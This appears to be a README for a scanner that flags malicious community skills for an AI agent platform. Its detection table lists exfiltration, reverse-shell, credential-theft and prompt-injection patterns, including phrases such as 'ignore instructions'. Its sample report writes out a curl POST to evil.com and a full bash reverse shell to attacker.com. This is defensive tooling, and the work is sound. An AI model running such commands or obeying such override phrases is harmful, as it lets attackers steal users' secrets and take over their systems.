# 🛡️ Clawdbot Skill Flag

**The first security scanner for Clawdbot/OpenClaw skills.**

Created by DarkM00n — Bug Bounty Hunter & Security Researcher.

## The Problem

ClawdHub has 700+ community skills with **no security verification**. Skills have complete system access — they can read files, execute commands, and access credentials.

This scanner helps you identify potentially malicious skills before they compromise your system.

## Features

- 🔍 **Pattern-based detection** for common attack vectors
- 🎯 **Risk scoring** (0-100) for each skill
- 📊 **Detailed reports** with file/line references
- ⚡ **Fast scanning** of all installed skills
- 🛡️ **Whitelist support** for known-safe patterns

## What It Detects

| Category | Examples |
|----------|----------|
| 🔴 Data Exfiltration | curl/wget to external URLs, requests.post() |
| 🔴 Backdoors | Reverse shells, nc -e, bash -i |
| 🔴 Credential Theft | ~/.ssh access, AWS credentials, .env files |
| 🟠 Prompt Injection | "ignore instructions", "system override" |
| 🟠 Code Execution | eval(), exec(), subprocess shell=True |
| 🟡 Persistence | Cron jobs, systemd units, bashrc mods |
| 🟡 Obfuscation | Base64 payloads, hex encoding, marshal |

## Installation

The skill is already in your workspace. Just use it:

```bash
# Via Clawdbot
"Scan all my skills for security issues"

# Or directly
python3 skills/skill-flag/scanner.py --all
```

## Usage

### Scan all installed skills
```bash
python3 scanner.py --all
```

### Scan specific skill
```bash
python3 scanner.py --skill crypto-tracker
```

### Verbose output
```bash
python3 scanner.py --all --verbose
```

### Export as JSON
```bash
python3 scanner.py --all --json report.json
```

## Example Output

```
============================================================
🛡️  CLAWDBOT SECURITY SCAN REPORT
============================================================
📅 Date: 2026-01-30 19:45:00
📁 Skills scanned: 12

📊 SUMMARY
  ✅ Clean:    9
  🟢 Low:      2
  🟡 Medium:   0
  🟠 High:     0
  🔴 Critical: 1

📋 DETAILS
------------------------------------------------------------

shady-skill
  Risk: 🔴 CRITICAL (score: 95)
  Files: 3
  Findings (4):
    • [exfiltration] curl_external
      curl to external URL - potential data exfiltration
      📄 script.py:45
      └─ subprocess.run(['curl', '-X', 'POST', 'https://evil.com/collect'...

    • [backdoors] bash_reverse_shell
      Bash reverse shell
      📄 install.sh:12
      └─ bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

## Risk Levels

| Score | Level | Action |
|-------|-------|--------|
| 0-20 | ✅ Clean | Safe to use |
| 21-40 | 🟢 Low | Minor concerns, probably OK |
| 41-60 | 🟡 Medium | Review recommended |
| 61-80 | 🟠 High | Careful inspection needed |
| 81-100 | 🔴 Critical | Do not use without audit |

## False Positives

Some legitimate skills need network access. The scanner flags them for review but doesn't block:

- **Price trackers** → API calls to exchanges (whitelisted)
- **Email skills** → Network access expected
- **Web scrapers** → HTTP requests expected

Customize `patterns/*.yaml` whitelist for your needs.

## Pro Version (Coming Soon)

- ⏰ Continuous monitoring
- 🌐 ClawdHub pre-install scanning
- 📋 Custom whitelist/blacklist
- 📧 Scheduled reports + alerts
- 🔗 Webhook integration

**Interested?** DM @Luna0bscure on X.

## Contributing

Found a malicious pattern we don't detect? Open an issue or PR.

## License

MIT

## Author

**DarkM00n** — Bug bounty hunter, Bitcoin security researcher, AI hacker.

- X: [@Luna0bscure](https://x.com/Luna0bscure)
- GitHub: [DarkM00n](https://github.com/darkmoon)

---

*"Scan before you install. Trust, but verify."* 🛡️
